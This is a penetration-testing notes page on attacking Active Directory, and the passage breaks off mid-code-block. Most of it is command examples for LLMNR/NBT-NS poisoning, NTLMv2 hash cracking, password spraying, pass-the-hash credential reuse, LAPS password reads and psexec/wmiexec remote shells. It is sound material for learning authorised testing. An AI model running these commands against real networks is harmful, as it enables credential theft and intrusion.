<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>ovelny - chaos/windows-exploitation/active-directory</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta
      name="description"
      content="ovelny - notes on infosec, penetration testing, programming and others"
    />
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
    <link
      href="/atom.xml"
      rel="alternate"
      title="ovelny"
      type="application/atom+xml"
    />
    <script src="/assets/js/scramble-text.min.js" defer></script>
    <script src="/assets/js/zoom-images.min.js" defer></script>
    <meta name="twitter:card" content="summary"/>
    <meta name="twitter:site" content="@ovelny"/>
    <meta name="twitter:title" content="ovelny - chaos/windows-exploitation/active-directory"/>
    <meta name="twitter:image" content="https://ovelny.sh/assets/images/ovelny-logo.png"/>
    <meta name="twitter:image:alt" content="ovelny logo: 6 white circles grouped together forming a triangle shape, with a black background."/>
  </head>
  <body>

    <header>
      <section>
        <a href="/">
          <img
            class="logo"
            src="/assets/images/ovelny-pfp.png"
            alt="ovelny profile picture: a glitched picture of a three-eyed girl, staring intensely at the viewer."
          />
        </a>
        <h2><a class="ovelny" href="/">ovelny</a></h2>
      </section>
      <nav>
        <a href="/">home</a>
        <a href="/chaos/">chaos</a>
        <a href="/phasm/">phasm</a>
        <a href="/support/">support</a>
        <a href="/atom.xml" target="_blank" rel="noopener noreferrer">rss</a>
        <a href="/about/">about</a>
      </nav>
    </header>
    <main>

    
    <h1>active directory</h1>

<p>attempting to document the behemoth that is active directory from an offensive standpoint, as clearly as possible.</p>

<p>some commands are already referenced in <a href="https://ovelny.sh/chaos/windows-exploitation/windows-snippets-and-commands/" rel="nofollow">windows snippets and commands</a>.</p>

<h2>enumeration</h2>

<p>enumerating AD is hell because there is just so much to process. having a step-by-step plan is important to incrementally gather as much data as possible. documenting everything is also mandatory to ensure we never miss any clues and keep track of what we&#39;ve already tried.</p>

<p>if we already have a foothold in the internal infrastructure, listening to the network and paying close attention to the traffic is a viable first step. without a GUI, relevant tools are tcpdump, net-creds and others. with a GUI, wireshark is recommended.</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># tcpdump</span>
<span class="nb">sudo </span>tcpdump <span class="nt">-i</span> &lt;interface&gt;
<span class="c"># save .pcap file with full-sized packets</span>
<span class="nb">sudo </span>tcpdump <span class="nt">-i</span> &lt;interface&gt; <span class="nt">-s</span> 65535 <span class="nt">-w</span> &lt;file&gt;

<span class="c"># net-creds</span>
<span class="nb">sudo </span>net-creds <span class="nt">-i</span> &lt;interface&gt;
</code></pre></div>

<p>you can also use responder in analyze mode to simply inspect traffic. this mode will not poison anything and just listen to connections:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># responder</span>
<span class="nb">sudo </span>responder <span class="nt">-I</span> &lt;interface&gt; <span class="nt">-A</span>
</code></pre></div>

<p>we can then get active and try for a ping sweep with the data we have. keep in mind it might not show everything as ICMP can always be disabled on a host. regardless, fping is one of the most appropriate tools for this:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># fping:</span>
<span class="c">#   -a to show alive targets</span>
<span class="c">#   -s to print statistics after scan</span>
<span class="c">#   -g to generate targets from CIDR notation</span>
<span class="c">#   -q to hide per-target results</span>
fping <span class="nt">-asgq</span> 172.16.4.0/23
</code></pre></div>

<p>with our list of hosts gathered both passively and actively, we can use nmap to finally discover ports and services on them:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># nmap aggressive scan</span>
nmap <span class="nt">-A</span> <span class="nt">-iL</span> &lt;hosts list&gt; <span class="nt">-oA</span> nmap-scan
</code></pre></div>

<p>now that we enumerated hosts, we need to enumerate users. the critical step is to find valid credentials, even from a low-privileged user, as this will open us up to a myriad of possibilities for further enumeration and attacks. passive enumeration from the target&#39;s website and social media are out-of-scope for this document but should definitely be leveraged, too.</p>

<p>internally, we might use kerbrute for this. it takes advantage of the fact that kerberos pre-auth failures often don&#39;t trigger logs or alerts, so we can try usernames in peace:</p>

<div class="highlight"><pre class="highlight shell"><code>kerbrute userenum <span class="nt">-d</span> &lt;domain name&gt; <span class="nt">--dc</span> &lt;DC IP&gt; &lt;wordlist&gt; <span class="nt">-o</span> &lt;output file&gt;
</code></pre></div>

<h2>getting offensive</h2>

<p>now that we got our initial enumeration done, it&#39;s time to get a bit more aggressive. our goal is still to find a valid set of credentials to start the real work. we&#39;ll exclude SMB relay attacks for now and focus on network poisoning and password spraying.</p>

<p>when DNS fails for host identification between windows machines, LLMNR (link-local multicast name resolution) acts as a fallback. it uses UDP port 5355. if LLMNR also fails, then NBT-NS (netbios name service) takes its place, and uses UDP port 137.</p>

<p>both of those windows components, acting as contingencies, are listening to any host on the network that is able to reply. in other words, if a host is looking for a service with DNS and the latter fails, you can pretend to be that service and the host will blindly trust you, sending its credentials if it is required. we could also relay this authentication request to another protocol, like LDAP. but for now, we want to collect hashes and attempt to crack them:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># first, we disable our firewall to make sure all</span>
<span class="c"># ports opened by responder will be available</span>
<span class="nb">sudo </span>ufw disable

<span class="c"># run responder with default settings.</span>
<span class="c"># this time we're not only listening,</span>
<span class="c"># we are poisoning requests.</span>
<span class="nb">sudo </span>responder <span class="nt">-I</span> &lt;interface&gt;

<span class="c"># run responder with WPAD rogue</span>
<span class="c"># server and fingerprint the remote</span>
<span class="c"># host OS and version.</span>
<span class="c"># this will capture all HTTP requests</span>
<span class="c"># by all users launching internet explorer,</span>
<span class="c"># if auto-detect settings are enabled.</span>
<span class="nb">sudo </span>responder <span class="nt">-wf</span> <span class="nt">-I</span> &lt;interface&gt;

<span class="c"># captured hashes are stored in /usr/share/responder/logs.</span>
</code></pre></div>

<p>most of the hashes obtained will be NTLMv2, which we can crack with hashcat&#39;s mode 5600. if we obtained another hash, this <a href="https://hashcat.net/wiki/doku.php?id=example_hashes" rel="nofollow">hashcat page</a> can be a great resource to identify it. you can also use <code>hashid</code>:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># identify hash and find appropriate hashcat mode</span>
hashid <span class="nt">-m</span> &lt;<span class="nb">hash</span><span class="o">&gt;</span>

<span class="c"># identify hash and find appropriate john mode</span>
hashid <span class="nt">-j</span> &lt;<span class="nb">hash</span><span class="o">&gt;</span>
</code></pre></div>

<p>we can then crack the hash with hashcat or john. NTLMv2 cannot be used &quot;as is&quot; for pass-the-hash attacks, so this is our only option. keep in mind that large / complex passwords might be very long to crack, or even impossible:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># hashcat</span>
hashcat <span class="nt">-m</span> 5600 &lt;<span class="nb">hash</span><span class="o">&gt;</span> &lt;wordlist&gt;

<span class="c"># or with john</span>
john &lt;<span class="nb">hash </span>file&gt; <span class="nt">--wordlist</span><span class="o">=</span>&lt;wordlist&gt;
</code></pre></div>

<p>if our internal access is through a windows host, we can use <a href="https://github.com/Kevin-Robertson/Inveigh" rel="nofollow">inveigh</a> instead, which does the same things as responder. once downloaded on the windows host, use the following commands:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># import inveigh</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\Inveigh.ps1</span><span class="w">

</span><span class="c"># list all available parameters</span><span class="w">
</span><span class="c"># a wiki is also available: https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters</span><span class="w">
</span><span class="p">(</span><span class="n">Get-Command</span><span class="w"> </span><span class="nx">Invoke-Inveigh</span><span class="p">)</span><span class="o">.</span><span class="nf">Parameters</span><span class="w">

</span><span class="c"># start inveigh with LLMNR and NBNS spoofing,</span><span class="w">
</span><span class="c"># output to console and write to a file</span><span class="w">
</span><span class="n">Invoke-Inveigh</span><span class="w"> </span><span class="nx">Y</span><span class="w"> </span><span class="nt">-NBNS</span><span class="w"> </span><span class="nx">Y</span><span class="w"> </span><span class="nt">-ConsoleOutput</span><span class="w"> </span><span class="nx">Y</span><span class="w"> </span><span class="nt">-FileOutput</span><span class="w"> </span><span class="nx">Y</span><span class="w">
</span></code></pre></div>

<p>the powershell version of inveigh is however considered legacy. the C# version is the most updated one. once compiled (see the github page), we can use it like this:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># run inveigh with default parameters</span><span class="w">
</span><span class="o">.</span><span class="n">\Inveigh.exe</span><span class="w">

</span><span class="c"># if you hit the escape key during the run,</span><span class="w">
</span><span class="c"># you'll end up in console mode: run HELP to see</span><span class="w">
</span><span class="c"># available commands. you can then use the listed</span><span class="w">
</span><span class="c"># GET commands to view captured hashes and usernames.</span><span class="w">
</span><span class="c"># very practical.</span><span class="w">
</span></code></pre></div>

<p>finally, be aware that poisoning LLMNR / NBT-NS might not be possible if those are disabled on a good, secured network. it is however painful to fully disable NBT-NS, as it needs to be done on each host individually rather than with a group policy, so the above steps are always worth trying.</p>

<p>if this didn&#39;t work to gather anything meaningful, the only alternative at this point would be password spraying. which is something worth tyring even if the previous steps worked anyway.</p>

<p>the main thing to be cautious of with password spraying is account lockout. as a rule of thumb, it is best to wait over an hour between attempts, and make 2 of them at most. but the best course of action is to find the password policy before attempting any attack, and adjust password spraying accordingly.</p>

<p>here is the default password policy when a new domain is created:</p>

<table><thead>
<tr>
<th>policy</th>
<th>default Value</th>
</tr>
</thead><tbody>
<tr>
<td>enforce password history</td>
<td>24 days</td>
</tr>
<tr>
<td>maximum password age</td>
<td>42 days</td>
</tr>
<tr>
<td>minimum password age</td>
<td>1 day</td>
</tr>
<tr>
<td>minimum password length</td>
<td>7</td>
</tr>
<tr>
<td>password must meet complexity requirements</td>
<td>enabled</td>
</tr>
<tr>
<td>store passwords using reversible encryption</td>
<td>disabled</td>
</tr>
<tr>
<td>account lockout duration</td>
<td>not set</td>
</tr>
<tr>
<td>account lockout threshold</td>
<td>0</td>
</tr>
<tr>
<td>reset account lockout counter after</td>
<td>not set</td>
</tr>
</tbody></table>

<p>some password policies enforce account unlocking only through the action of the admin: in that case, you must avoid locking accounts at all costs, even more than you normally would. don&#39;t ruin the admin&#39;s day.</p>

<p>anyway. with valid credentials, we can use crackmapexec / netexec to obtain the password policy:</p>

<div class="highlight"><pre class="highlight shell"><code>nxc smb &lt;IP address&gt; <span class="nt">-u</span> &lt;user&gt; <span class="nt">-p</span> &lt;password&gt; <span class="nt">--pass-pol</span>
</code></pre></div>

<p>without valid credentials, we might still be in luck if a SMB NULL session or LDAP anonymous bind are present.</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># using rpcclient to leverage a SMB NULL session.</span>
<span class="c"># first, connect to the session:</span>
rpcclient <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span> &lt;IP address&gt;

<span class="c"># in rpcclient's prompt, obtain information about</span>
<span class="c"># the domain:</span>
querydominfo

<span class="c"># obtain the password policy:</span>
getdompwinfo

<span class="c"># obtaining the password policy with enum4linux:</span>
enum4linux <span class="nt">-P</span> &lt;IP address&gt;

<span class="c"># with enum4linux-ng, exporting results to file:</span>
enum4linux-ng <span class="nt">-P</span> &lt;IP address&gt; <span class="nt">-oA</span> &lt;file name&gt;
</code></pre></div>

<p>if we are on a windows host instead, we can proceed like this:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># connect to SMB NULL session:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">\\DC01\ipc</span><span class="err">$</span><span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="nx">/u:</span><span class="s2">""</span><span class="w">

</span><span class="c"># trying to connect with an account:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">\\DC01\ipc</span><span class="err">$</span><span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="nx">/u:guest</span><span class="w">

</span><span class="c"># trying to connect with credentials:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">\\DC01\ipc</span><span class="err">$</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="nx">/u:guest</span><span class="w">
</span></code></pre></div>

<p>LDAP anonymous binds can also allow you to retrieve information from the domain without any authentication:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># getting password policy with ldapsearch.</span>
<span class="c"># "pwdProperties: 1" in output means that</span>
<span class="c"># password complexity is set:</span>
ldapsearch <span class="nt">-h</span> &lt;IP address&gt; <span class="nt">-x</span> <span class="nt">-b</span> <span class="s2">"DC=&lt;name&gt;,DC=&lt;domain&gt;"</span> <span class="nt">-s</span> sub <span class="s2">"*"</span> | <span class="nb">grep</span> <span class="nt">-m</span> 1 <span class="nt">-B</span> 10 pwdHistoryLength
</code></pre></div>

<p>if we can already authenticate on a windows host joined to the domain, we can live off the land to get the password policy:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># get password policy with net.exe:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">accounts</span><span class="w">
</span></code></pre></div>

<p>if we can download it, powerview is also an option on a windows host:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># import powerview:</span><span class="w">
</span><span class="n">import-module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">

</span><span class="c"># get domain policy, including</span><span class="w">
</span><span class="c"># password policy:</span><span class="w">
</span><span class="n">Get-DomainPolicy</span><span class="w">
</span></code></pre></div>

<p>now to conduct our password spraying attack, we need a list of valid domain users. SMB NULL sessions and LDAP anonymous binds can also help for this purpose. if none of them are available, kerbrute can be used to check for existing users with a wordlist of possible guesses, like those on the <a href="https://github.com/insidetrust/statistically-likely-usernames" rel="nofollow">statistically-likely-usernames repo</a>. <a href="https://github.com/initstring/linkedin2username" rel="nofollow">linkedin2username</a> can also be used to gather possible usernames. remember that you might have already gathered usernames with responder or inveight, too.</p>

<p>keep track of all your attempts no matter what you use, to avoid wasting your time retrying the same thing over and over.</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># tools leveraging SMB NULL sessions to gather usernames:</span>
enum4linux <span class="nt">-U</span> &lt;IP address&gt;  | <span class="nb">grep</span> <span class="s2">"user:"</span> | <span class="nb">cut</span> <span class="nt">-f2</span> <span class="nt">-d</span><span class="s2">"["</span> | <span class="nb">cut</span> <span class="nt">-f1</span> <span class="nt">-d</span><span class="s2">"]"</span>
rpcclient <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span> &lt;IP address&gt; <span class="c"># run "enumdomusers" in rpcclient prompt</span>
nxc smb &lt;IP address&gt; <span class="nt">--users</span>

<span class="c"># tools leveraging LDAP anonymous binds:</span>
ldapsearch <span class="nt">-h</span> &lt;IP address&gt; <span class="nt">-x</span> <span class="nt">-b</span> <span class="s2">"DC=&lt;name&gt;,DC=&lt;domain&gt;"</span> <span class="nt">-s</span> sub <span class="s2">"(&amp;(objectclass=user))"</span>  | <span class="nb">grep </span>sAMAccountName: | <span class="nb">cut</span> <span class="nt">-f2</span> <span class="nt">-d</span><span class="s2">" "</span>
windapsearch.py <span class="nt">--dc-ip</span> &lt;IP address&gt; <span class="nt">-u</span> <span class="s2">""</span> <span class="nt">-U</span>

<span class="c"># kerbrute if we have none of the access above:</span>
kerbrute userenum <span class="nt">-d</span> &lt;domain name&gt; <span class="nt">--dc</span> &lt;IP address&gt; &lt;wordlist&gt;
</code></pre></div>

<p>if we found valid credentials, we can now use them to build a user list:</p>

<div class="highlight"><pre class="highlight shell"><code>nxc smb &lt;IP address&gt; <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> &lt;password&gt; <span class="nt">--users</span>
</code></pre></div>

<p>we&#39;re now ready for password spraying:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># bash loop with rpcclient:</span>
<span class="nb">cat</span> &lt;user list&gt; | <span class="k">while </span><span class="nb">read </span>user<span class="p">;</span> <span class="k">do </span>rpcclient <span class="nt">-U</span> <span class="s2">"</span><span class="nv">$user</span><span class="s2">%&lt;password&gt;"</span> <span class="nt">-c</span> <span class="s2">"getusername;quit"</span> &lt;IP address&gt; | <span class="nb">grep </span>Authority<span class="p">;</span> <span class="k">done</span>

<span class="c"># with kerbrute:</span>
kerbrute passwordspray <span class="nt">-d</span> &lt;domain name&gt; <span class="nt">--dc</span> &lt;IP address&gt; &lt;user list&gt; &lt;password&gt;

<span class="c"># with crackmapexec / netexec:</span>
nxc smb &lt;IP address&gt; <span class="nt">-u</span> &lt;user list&gt; <span class="nt">-p</span> &lt;password&gt; | <span class="nb">grep</span> +
<span class="c"># validate credentials found:</span>
nxc smb &lt;IP address&gt; <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> &lt;password&gt;
</code></pre></div>

<p>one important thing with crackmapexec / netexec is that it tries to find credentials on domain user accounts by default. we can try to authenticate directly to a host with the <code>--local-auth</code> flag, which is particularly useful with local administrator accounts, or other privileged accounts.</p>

<p>say we found administrator credentials in the form of administrator:NT-hash. we can attempt to find if these credentials are re-used on other hosts, which is a likely scenario:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># scan all hosts in &lt;IP address&gt;/23 subnet with a set of admin credentials,</span>
<span class="c"># using pass-the-hash:</span>
nxc smb &lt;IP address&gt;/23 <span class="nt">-u</span> administrator <span class="nt">-H</span> &lt;NT <span class="nb">hash</span><span class="o">&gt;</span> <span class="nt">--local-auth</span> | <span class="nb">grep</span> +
</code></pre></div>

<p>this is a noisy process that should be used with caution. this method can be prevented with LAPS (Local Administrator Password Solution), which makes AD manage local admin passwords and rotate them automatically.</p>

<p>on a windows host, we can perform password spraying with <a href="https://github.com/dafthack/DomainPasswordSpray" rel="nofollow">DomainPasswordSpray</a>. this tool generates a user list on its own if our machine is already domain-joined. it also figures out which accounts need to be excluded from our attempts to avoid lockouts, by querying the domain password policy. but we should still remain careful and not trust any tool blindly:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># import DomainPasswordSpray:</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\DomainPasswordSpray.ps1</span><span class="w">

</span><span class="c"># let DomainPasswordSpray generate a user list and</span><span class="w">
</span><span class="c"># perform password spraying against them, logging</span><span class="w">
</span><span class="c"># all successes in a file specified with -OutFile:</span><span class="w">
</span><span class="n">Invoke-DomainPasswordSpray</span><span class="w"> </span><span class="nt">-Password</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">password</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">filename</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">

</span><span class="c"># if we're not domain-joined from our host, use</span><span class="w">
</span><span class="c"># -UserList flag to specify a user list.</span><span class="w">
</span></code></pre></div>

<h2>we&#39;re finally in: credentialed enumeration</h2>

<p>now that we got our hands on at least one valid set of credentials, the first thing to do is making ourselves aware of the security posture of the hosts and domain. only after this should we allow ourselves to enumerate it from the inside.</p>

<p>with a powershell prompt, here is what we can use:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># get current windows / microsoft defender status.</span><span class="w">
</span><span class="c"># RealTimeProtectionEnabled parameter will tell you </span><span class="w">
</span><span class="c"># if defender is enabled or not on the system:</span><span class="w">
</span><span class="n">Get-MpComputerStatus</span><span class="w">

</span><span class="c"># get applocker policy rules for application</span><span class="w">
</span><span class="c"># allowlists. in many cases, it is readily apparent</span><span class="w">
</span><span class="c"># that some executable paths are blocked for an</span><span class="w">
</span><span class="c"># application but not all of them, which makes it</span><span class="w">
</span><span class="c"># easy to execute it from another place:</span><span class="w">
</span><span class="n">Get-AppLockerPolicy</span><span class="w"> </span><span class="nt">-Effective</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">RuleCollections</span><span class="w">

</span><span class="c"># check if our use of powershell is constrained</span><span class="w">
</span><span class="c"># or not:</span><span class="w">
</span><span class="bp">$ExecutionContext</span><span class="o">.</span><span class="nf">SessionState</span><span class="o">.</span><span class="nf">LanguageMode</span><span class="w">
</span></code></pre></div>

<p>with <a href="https://github.com/leoloobeek/LAPSToolkit" rel="nofollow">LAPSToolkit</a>, we can enumerate how LAPS is set on the domain, and find which domain users from AD groups can read LAPS passwords, among other things:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># import LAPSToolkit:</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\LAPSToolkit.ps1</span><span class="w">

</span><span class="c"># find which AD groups can read the</span><span class="w">
</span><span class="c"># ms-Mcs-AdmPwd attribute, and thus</span><span class="w">
</span><span class="c"># the LAPS password:</span><span class="w">
</span><span class="n">Find-LAPSDelegatedGroups</span><span class="w">

</span><span class="c"># find which group has read access and</span><span class="w">
</span><span class="c"># if any user has all extended rights, on</span><span class="w">
</span><span class="c"># all AD computers with LAPS enabled.</span><span class="w">
</span><span class="c"># users with all extended rights can also</span><span class="w">
</span><span class="c"># view passwords:</span><span class="w">
</span><span class="n">Find-AdmPwdExtendedRights</span><span class="w">

</span><span class="c"># find all computers with LAPS enabled,</span><span class="w">
</span><span class="c"># and return password expiration and</span><span class="w">
</span><span class="c"># actual password if user has access</span><span class="w">
</span><span class="c"># to it:</span><span class="w">
</span><span class="n">Get-LAPSComputers</span><span class="w">
</span></code></pre></div>

<p>now let&#39;s move onto credentialed enumeration. from a linux host, many options are available as long as we have a set of credentials even from a low-privileged user. crackmapexec / netexec hold a lot of them through the use of modules coming directly from impacket and powersploit:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># enumerate all users in domain:</span>
nxc smb &lt;DC IP&gt; <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> &lt;password&gt; <span class="nt">--users</span>

<span class="c"># enumerate all groups in domain:</span>
nxc smb &lt;DC IP&gt; <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> &lt;password&gt; <span class="nt">--groups</span>

<span class="c"># enumerate all logged in users on host:</span>
<span class="c"># if our user appears as "Pwn3d!", it means</span>
<span class="c"># we are a local admin on this host:</span>
nxc smb &lt;host IP&gt; <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> &lt;password&gt; <span class="nt">--loggedon-users</span>

<span class="c"># enumerate all shares in domain:</span>
nxc smb &lt;DC IP&gt; <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> &lt;password&gt; <span class="nt">--shares</span>

<span class="c"># use spider_plus module to crawl through a specified</span>
<span class="c"># share. results are written in a json file located in</span>
<span class="c"># /tmp/cme_spider_plus/&lt;host IP&gt;:</span>
nxc smb &lt;DC IP&gt; <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> &lt;password&gt; <span class="nt">-M</span> spider_plus <span class="nt">--share</span> <span class="s1">'&lt;share name&gt;'</span>
</code></pre></div>

<p><code>smbmap</code> can also be used to enumerate SMB shares from a linux host:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># check access and permission levels for</span>
<span class="c"># current user:</span>
smbmap <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> &lt;password&gt; <span class="nt">-d</span> &lt;DC name&gt; <span class="nt">-H</span> &lt;DC IP&gt;

<span class="c"># recursively list all directories in share:</span>
smbmap <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> &lt;password&gt; <span class="nt">-d</span> &lt;DC name&gt; <span class="nt">-H</span> &lt;DC IP&gt; <span class="nt">-R</span> <span class="s1">'&lt;share name&gt;'</span> <span class="nt">--dir-only</span>
</code></pre></div>

<p><code>rpcclient</code> allows us to send commands via MS-RPC as well. we can perform many actions in AD with this tool, many of them not listed here yet:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># start a SMB NULL session:</span>
rpcclient <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span> &lt;DC IP&gt;

<span class="c"># from a rpcclient prompt, perform user</span>
<span class="c"># enumeration for built-in administrator</span>
<span class="c"># whose RID (Relative Identifier) is always</span>
<span class="c"># hex value 0x1f4:</span>
queryuser 0x1f4

<span class="c"># from a rpcclient prompt, enumerate all users</span>
<span class="c"># and gather their RIDs:</span>
enumdomusers
</code></pre></div>

<p>we can also use <code>impacket</code> tools to enumerate and act on an active directory through many windows protocols. <code>psexec.py</code> is particularly interesting as it provides us an interactive remote shell, logged as SYSTEM on the target host:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># connect with psexec, with a user with</span>
<span class="c"># local admin privileges:</span>
psexec.py &lt;DC name&gt;/&lt;username&gt;:<span class="s1">'&lt;password&gt;'</span>@&lt;target IP&gt;
</code></pre></div>

<p>another valuable impacket tool is <code>wmiexec.py</code>, which provides us a semi-interactive shell as the local admin user we connected with. commands are executed through Windows Management Instrumentation. this is more stealthy than <code>psexec.py</code> but nothing miraculous against EDR systems and others:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># connect with wmiexec, with a user with</span>
<span class="c"># local admin privileges:</span>
wmiexec.py &lt;DC name&gt;/&lt;username&gt;:<span class="s1">'&lt;password&gt;'</span>@&lt;target IP&gt;
</code></pre></div>

<p><code>windapsearch</code> is another tool that can enumerate users, groups and computers on AD:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># enumerate users in domain admins group:</span>
python3 windapsearch.py <span class="nt">--dc-ip</span> &lt;DC IP&gt; <span class="nt">-u</span> &lt;username&gt;@&lt;DC name&gt; <span class="nt">-p</span> &lt;password&gt; <span class="nt">--da</span>

<span class="c"># enumerate users with elevated privileges</span>
python3 windapsearch.py <span class="nt">--dc-ip</span> &lt;DC IP&gt; <span class="nt">-u</span> &lt;username&gt;@&lt;DC name&gt; <span class="nt">-p</span> &lt;password&gt; <span class="nt">-PU</span>
</code></pre></div>

<p>one of the most valuable tools for AD enumeration is bloodhound, as it allows us to navigate data graphically and figure out attack paths that would be challenging to parse on the command line. it also features a <code>cypher</code> language to parse data, much like using SQL to query databases.</p>

<p>to gather all this data that will be represented graphically, bloodhound uses ingestors. at first only a powershell ingestor was available, but now a python one is present through the <code>bloodhound.py</code> package on kali.</p>

<p>we can then gather data with credentials like this:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># gather as much data as possible from</span>
<span class="c"># bloodhound ingestor with -c all flag:</span>
bloodhound-python <span class="nt">-u</span> <span class="s1">'&lt;username&gt;'</span> <span class="nt">-p</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">-ns</span> &lt;DC IP&gt; <span class="nt">-d</span> &lt;DC name&gt; <span class="nt">-c</span> all
</code></pre></div>

<p>this will produce <code>.json</code> files in our current working directory. those files have to be uploaded on bloodhound&#39;s GUI, which we&#39;ll start with the following:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># load neo4j, the database used to load data</span>
<span class="c"># and run cypher queries:</span>
<span class="nb">sudo </span>neo4j start

<span class="c"># start bloodhound GUI, which will prompt</span>
<span class="c"># for credentials. default ones are neo4j:neo4j,</span>
<span class="c"># don't forget to change them:</span>
bloodhound <span class="nt">--use-gl</span><span class="o">=</span>egl <span class="c"># flag needed for X11 forwarding</span>

<span class="c"># on current working directory, zip all</span>
<span class="c"># .json files we collected earlier:</span>
zip <span class="nt">-r</span> bloodhound.zip <span class="k">*</span>.json
</code></pre></div>

<p>next, click the <code>upload data</code> button in bloodhound&#39;s GUI and select the zip file we created to visualize results. the <code>analysis</code> tab will allow us to run queries against the database, either custom ones or pre-built ones. for custom queries, you can refer to the following <a href="https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/" rel="nofollow">cheatsheet</a> which is pretty extensive. that cheatsheet has been mirrored on this wiki <a href="https://ovelny.sh/chaos/tool-cheat-sheets/bloodhound/" rel="nofollow">here</a>.</p>

<p>from a windows host, credentialed enumeration is of course possible too. we can live off the land with the AD powershell module first:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># import AD module:</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">ActiveDirectory</span><span class="w">

</span><span class="c"># list all available modules and potential commands:</span><span class="w">
</span><span class="n">Get-Module</span><span class="w">

</span><span class="c"># enumerate basic information about the domain:</span><span class="w">
</span><span class="n">Get-ADDomain</span><span class="w">

</span><span class="c"># find account with SPNs, potentially kerberoastable:</span><span class="w">
</span><span class="n">Get-ADUser</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">ServicePrincipalName</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="s2">"</span><span class="bp">$null</span><span class="s2">"</span><span class="p">}</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="n">ServicePrincipalName</span><span class="w">

</span><span class="c"># list domain trust relationships:</span><span class="w">
</span><span class="n">Get-ADTrust</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w">

</span><span class="c"># get all AD group names:</span><span class="w">
</span><span class="n">Get-ADGroup</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">name</span><span class="w">

</span><span class="c"># get detailed info about a specific group:</span><span class="w">
</span><span class="n">Get-ADGroup</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"&lt;group name&gt;"</span><span class="w">

</span><span class="c"># list all members of specific group:</span><span class="w">
